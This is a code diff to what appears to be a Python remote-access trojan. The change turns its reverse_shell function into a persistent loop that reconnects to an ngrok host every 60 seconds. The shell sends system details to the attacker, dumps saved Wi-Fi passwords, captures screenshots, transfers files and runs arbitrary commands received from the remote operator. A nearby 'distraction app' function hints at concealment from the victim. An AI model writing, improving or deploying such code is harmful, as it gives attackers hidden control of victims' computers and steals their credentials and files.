@@ -1,3 +1,4 @@
+
 import os
 import re
 import time
@@ -323,83 +324,59 @@ def launch_distraction_app():
         pass
 
 def reverse_shell():
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((NGROK_HOST, NGROK_PORT))
-        
-
-        def send_data(data):
-            if not isinstance(data, bytes):
-                data = data.encode()
-            s.send(data + b"\n")
-
-        def get_system_info():
-            info = f"""
-OS         : {platform.system()} {platform.version()}
-Machine    : {platform.machine()}
-Processor  : {platform.processor()}
-Username   : {getpass.getuser()}
-Hostname   : {socket.gethostname()}
-IP (LAN)   : {socket.gethostbyname(socket.gethostname())}
-RAM        : {round(psutil.virtual_memory().total / (1024**3), 2)} GB
-"""
-            return info
-
-        def show_help():
-            return """Available Commands:
-    help                - Show this menu
-    info                - System info
-    wifi                - Dump saved Wi-Fi SSIDs + passwords
-    screenshot          - Capture screen & send
-    download <file>     - Download a file
-    upload <file>       - Upload a file
-    cd <dir>            - Change working directory
-    exit / quit         - Close shell"""
-
-        while True:
-            cmd = s.recv(1024).decode("utf-8").strip()
-
-            if not cmd:
-                continue
-
-            if cmd.lower() in ("exit", "quit"):
-                break
-
-            elif cmd == "help":
-                send_data(show_help())
-
-            elif cmd == "info":
-                send_data(get_system_info())
-
-            elif cmd == "wifi":
-                output_path = os.path.join(EXTRACT_FOLDER, "wifi_remote.txt")
-                extract_wifi()
-                with open(output_path, "rb") as f:
-                    s.sendall(b"STARTFILE\n")
-                    while True:
-                        chunk = f.read(1024)
-                        if not chunk:
-                            break
-                        s.sendall(chunk)
-                    s.sendall(b"\nENDFILE")
-
-            elif cmd == "screenshot":
-                try:
-                    ss_path = os.path.join(EXTRACT_FOLDER, "remote_screenshot.png")
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((NGROK_HOST, NGROK_PORT))
             
-                    # Try to take screenshot
-                    try:
-                        img = ImageGrab.grab()
-                        img.save(ss_path)
-                    except Exception as e:
-                        error_msg = f"[!] Screenshot failed: {e}"
-                        with open(os.path.join(EXTRACT_FOLDER, "screenshot_error.txt"), "w") as f:
-                            f.write(error_msg)
-                        send_data(error_msg)
-                        continue  # Skip sending file
-            
-                    # If saved successfully, send the file
-                    with open(ss_path, "rb") as f:
+
+            def send_data(data):
+                if not isinstance(data, bytes):
+                    data = data.encode()
+                s.send(data + b"\n")
+
+            def get_system_info():
+                info = f"""
+    OS         : {platform.system()} {platform.version()}
+    Machine    : {platform.machine()}
+    Processor  : {platform.processor()}
+    Username   : {getpass.getuser()}
+    Hostname   : {socket.gethostname()}
+    IP (LAN)   : {socket.gethostbyname(socket.gethostname())}
+    RAM        : {round(psutil.virtual_memory().total / (1024**3), 2)} GB
+    """
+                return info
+
+            def show_help():
+                return """Available Commands:
+        help                - Show this menu
+        info                - System info
+        wifi                - Dump saved Wi-Fi SSIDs + passwords
+        screenshot          - Capture screen & send
+        download <file>     - Download a file
+        upload <file>       - Upload a file
+        cd <dir>            - Change working directory
+        exit / quit         - Close shell"""
+
+            while True:
+                cmd = s.recv(1024).decode("utf-8").strip()
+
+                if not cmd:
+                    continue
+
+                if cmd.lower() in ("exit", "quit"):
+                    break
+
+                elif cmd == "help":
+                    send_data(show_help())
+
+                elif cmd == "info":
+                    send_data(get_system_info())
+
+                elif cmd == "wifi":
+                    output_path = os.path.join(EXTRACT_FOLDER, "wifi_remote.txt")
+                    extract_wifi()
+                    with open(output_path, "rb") as f:
                         s.sendall(b"STARTFILE\n")
                         while True:
                             chunk = f.read(1024)
@@ -407,62 +384,90 @@ RAM        : {round(psutil.virtual_memory().total / (1024**3), 2)} GB
                                 break
                             s.sendall(chunk)
                         s.sendall(b"\nENDFILE")
-            
-                    os.remove(ss_path)
-            
-                except Exception as e:
-                    send_data(f"[!] Screenshot process failed: {e}")
 
-
-            elif cmd.startswith("download "):
-                filename = cmd.split(" ", 1)[1]
-                if os.path.exists(filename):
+                elif cmd == "screenshot":
                     try:
-                        with open(filename, "rb") as f:
+                        ss_path = os.path.join(EXTRACT_FOLDER, "remote_screenshot.png")
+                
+                        # Try to take screenshot
+                        try:
+                            img = ImageGrab.grab()
+                            img.save(ss_path)
+                        except Exception as e:
+                            error_msg = f"[!] Screenshot failed: {e}"
+                            with open(os.path.join(EXTRACT_FOLDER, "screenshot_error.txt"), "w") as f:
+                                f.write(error_msg)
+                            send_data(error_msg)
+                            continue  # Skip sending file
+                
+                        # If saved successfully, send the file
+                        with open(ss_path, "rb") as f:
                             s.sendall(b"STARTFILE\n")
                             while True:
                                 chunk = f.read(1024)
                                 if not chunk:
                                     break
                                 s.sendall(chunk)
-                            s.sendall(b"\nENDFILE\n")
+                            s.sendall(b"\nENDFILE")
+                
+                        os.remove(ss_path)
+                
                     except Exception as e:
-                        send_data(f"[!] Error reading file: {str(e)}")
+                        send_data(f"[!] Screenshot process failed: {e}")
+
+
+                elif cmd.startswith("download "):
+                    filename = cmd.split(" ", 1)[1]
+                    if os.path.exists(filename):
+                        try:
+                            with open(filename, "rb") as f:
+                                s.sendall(b"STARTFILE\n")
+                                while True:
+                                    chunk = f.read(1024)
+                                    if not chunk:
+                                        break
+                                    s.sendall(chunk)
+                                s.sendall(b"\nENDFILE\n")
+                        except Exception as e:
+                            send_data(f"[!] Error reading file: {str(e)}")
+                    else:
+                        send_data("[!] File not found.")
+
+                        send_data("[!] File not found.")
+
+                elif cmd.startswith("upload "):
+                    filename = cmd.split(" ", 1)[1]
+                    with open(filename, "wb") as f:
+                        s.send(b"[+] Ready to receive.\n")
+                        while True:
+                            chunk = s.recv(1024)
+                            if b"ENDFILE" in chunk:
+                                f.write(chunk.replace(b"ENDFILE", b""))
+                                break
+                            f.write(chunk)
+                    send_data(f"[+] Upload complete: {filename}")
+
+                elif cmd.startswith("cd "):
+                    try:
+                        os.chdir(cmd[3:].strip())
+                        send_data(f"[+] Changed directory to {os.getcwd()}")
+                    except Exception as e:
+                        send_data(f"[!] Failed to change directory: {e}")
+
                 else:
-                    send_data("[!] File not found.")
+                    try:
+                        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+                        s.send(output)
+                    except subprocess.CalledProcessError as e:
+                        send_data(f"[!] Error: {e.output.decode()}")
 
-                    send_data("[!] File not found.")
-
-            elif cmd.startswith("upload "):
-                filename = cmd.split(" ", 1)[1]
-                with open(filename, "wb") as f:
-                    s.send(b"[+] Ready to receive.\n")
-                    while True:
-                        chunk = s.recv(1024)
-                        if b"ENDFILE" in chunk:
-                            f.write(chunk.replace(b"ENDFILE", b""))
-                            break
-                        f.write(chunk)
-                send_data(f"[+] Upload complete: {filename}")
-
-            elif cmd.startswith("cd "):
-                try:
-                    os.chdir(cmd[3:].strip())
-                    send_data(f"[+] Changed directory to {os.getcwd()}")
-                except Exception as e:
-                    send_data(f"[!] Failed to change directory: {e}")
-
-            else:
-                try:
-                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
-                    s.send(output)
-                except subprocess.CalledProcessError as e:
-                    send_data(f"[!] Error: {e.output.decode()}")
-
-    except Exception as e:
-        print(f"[!] Reverse shell failed: {e}")
-    finally:
-        s.close()
+        # except Exception as e:
+        #     print(f"[!] Reverse shell failed: {e}")
+        # finally:
+            s.close()
+        except Exception as e:
+            # Try again in 60 seconds
+            time.sleep(60)
 
 
 import pyautogui
@@ -498,6 +503,5 @@ if __name__ == "__main__":
         except Exception as e:
             pass  # Optionally print or log this
         time.sleep(60)
-
 
 
